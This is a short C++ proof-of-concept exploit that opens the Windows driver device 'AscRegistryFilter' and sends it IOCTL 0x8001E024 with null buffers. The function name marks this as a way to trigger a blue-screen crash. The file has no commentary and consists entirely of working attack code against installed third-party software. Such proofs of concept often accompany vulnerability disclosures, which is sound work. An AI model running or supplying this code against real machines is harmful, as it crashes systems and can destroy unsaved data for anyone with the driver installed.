#include <iostream>
#include <Windows.h>
#include <winioctl.h>

#define SymLinkName L"\\\\.\\AscRegistryFilter"

HANDLE hDevice;

void BSOD1_8001E024()
{
    DWORD dwWrite;
    DeviceIoControl(hDevice, 0x8001E024, NULL, 0, NULL, 0, &dwWrite, NULL);
}

int main(int argc, char* argv[])
{
    hDevice = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("Get Driver Handle Error with Win32 error code: %x\n", GetLastError());
        system("pause");
        return 0;
    }

    BSOD1_8001E024();

    system("pause");
    return 0;
}
